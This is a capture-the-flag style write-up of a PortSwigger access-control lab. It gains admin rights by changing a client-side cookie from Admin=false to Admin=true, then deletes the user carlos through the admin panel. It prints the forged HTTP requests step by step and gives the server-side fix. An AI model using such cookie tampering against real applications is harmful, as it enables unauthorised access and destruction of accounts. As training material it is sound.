# PortSwigger: User Role Controlled by Request Parameter

## 🎯 Objective

Access the admin panel as the low-privileged user `wiener` by exploiting a forgeable administrator cookie, then delete the user `carlos`.

**Category:** Access Control
**Lab:** User role controlled by request parameter

---

## 🧠 Vulnerability Concept

The application used a client-controlled cookie to determine whether the user was an administrator:

```http
Cookie: Admin=false
```

The server trusted this value instead of checking the user's actual role.

By changing:

```text
Admin=false
```

to:

```text
Admin=true
```

the server treated Wiener as an administrator.

---

## 🔎 Exploitation

### 1. Login

Logged in with:

```text
wiener:peter
```

Wiener is normally a low-privileged user.

---

### 2. Find the Admin Cookie

Captured a request in Burp Suite:

```http
GET /my-account?id=wiener HTTP/2

Cookie: Admin=false; session=...
```

The important part was:

```text
Admin=false
```

---

### 3. Modify the Cookie

Changed:

```text
Admin=false
```

to:

```text
Admin=true
```

The request became:

```http
GET /my-account?id=wiener HTTP/2

Cookie: Admin=true; session=...
```

The server returned `200 OK` and displayed the **Admin panel** link.

---

### 4. Access the Admin Panel

Requested:

```http
GET /admin HTTP/2

Cookie: Admin=true; session=...
```

The server allowed access to the admin panel.

The panel contained:

```text
/admin/delete?username=carlos
```

---

### 5. Delete Carlos

Sent:

```http
GET /admin/delete?username=carlos HTTP/2

Cookie: Admin=true; session=...
```

The server confirmed the deletion.

The lab was successfully solved.

---

## 💥 Why It Worked

The application trusted a value controlled by the user's browser:

```text
Admin=false
```

Instead of checking the user's real privileges, it effectively did:

```text
Admin=false → Normal user
Admin=true  → Administrator
```

Because the cookie could be modified by the client, Wiener could forge the administrator role.

---

## 🔑 Key Lesson

> **Never trust client-controlled data to determine authorization.**

A secure application should determine the user's role on the server side using trusted session/account information.

---

## 🛠️ Burp Suite Techniques

* HTTP Proxy
* HTTP History
* Repeater
* Cookie modification
* Request modification

---

## 🎯 Evidence



```md
![Admin Cookie Exploitation](method-based-access-control-solved.png)
```

---

## 🧠 Memory Trick

```text
Client says:
Admin=false → Admin=true

Vulnerable server:
"Okay, you're admin."

Secure server:
"I'll check your actual role myself."
```
